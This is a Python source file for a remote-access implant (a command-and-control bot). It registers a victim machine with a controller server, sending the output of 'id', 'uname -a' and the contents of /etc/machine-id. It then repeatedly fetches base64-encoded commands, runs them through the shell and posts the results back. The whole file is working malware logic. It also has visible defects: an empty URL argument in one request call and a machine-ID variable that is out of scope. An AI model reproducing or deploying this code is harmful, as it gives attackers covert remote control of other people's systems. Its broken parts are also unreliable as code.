import requests
import subprocess
import base64
import random
import string
import json
import time

REGISTER_URL = "http://127.0.0.1:5000/register"
COMMAND_URL = "http://127.0.0.1:5000/get_task"
SUBMIT_URL = "http://127.0.0.1:5000/submit_result"
BID = "6c77e9314a52d0ad31eff72af1806c12" # a random value per iteration of the bot for build tracking.

def register():
    # Execute shell command "id" and base64 encode output
    implant_user = subprocess.check_output(['id']).strip()
    implant_user = base64.b64encode(implant_user).decode('utf-8')

    # Execute shell command "uname -a" and base64 encode output
    implant_uname = subprocess.check_output(['uname', '-a']).strip()
    implant_uname = base64.b64encode(implant_uname).decode('utf-8')

    # Send HTTP POST request to register implant with server
    register_data = {
        'implant_machine_id': implant_machine_id,
        'implant_build_id': BID,
        'implant_user': implant_user,
        'implant_uname': implant_uname
    }
    register_response = requests.post('http://127.0.0.1:5000/register', data=register_data)
    if register_response.status_code != 200:
        print('Registration failed')
        exit()


def cmdloop():
    # Enter while loop to retrieve and execute tasks
    while True:
        # Send HTTP POST request to get task
        get_task_data = {'implant_machine_id': implant_machine_id}
        get_task_response = requests.post(, data=get_task_data)

        # Check response code
        if get_task_response.status_code == 404:
            # If task not found, sleep for 60 seconds and try again
            time.sleep(60)
            continue
        elif get_task_response.status_code != 200:
            # If unexpected response code, print error and exit
            print('Error getting task:', get_task_response.status_code)
            exit()

        # Extract task UUID and task data from JSON response
        task_json = json.loads(get_task_response.text)
        task_uuid = task_json['task_uuid']
        task_data = task_json['task_data']

        # Decode task data and execute as shell command
        task_command = base64.b64decode(task_data).decode('utf-8')
        task_output = subprocess.check_output(task_command, shell=True).strip()

        # Base64 encode output and submit task result to server
        task_result = base64.b64encode(task_output).decode('utf-8')
        submit_result_data = {
            'implant_machine_id': implant_machine_id,
            'task_uuid': task_uuid,
            'task_result': task_result
        }
        submit_result_response = requests.post(SUBMIT_URL, data=submit_result_data)

        # Sleep for 60 seconds before getting next task
        time.sleep(60)


def main():
    # Read implant machine ID from file and remove newline
    with open('/etc/machine-id', 'r') as f:
        implant_machine_id = f.read().rstrip()
    register()
    cmdloop()

if __name__ == "__main__":
    main()
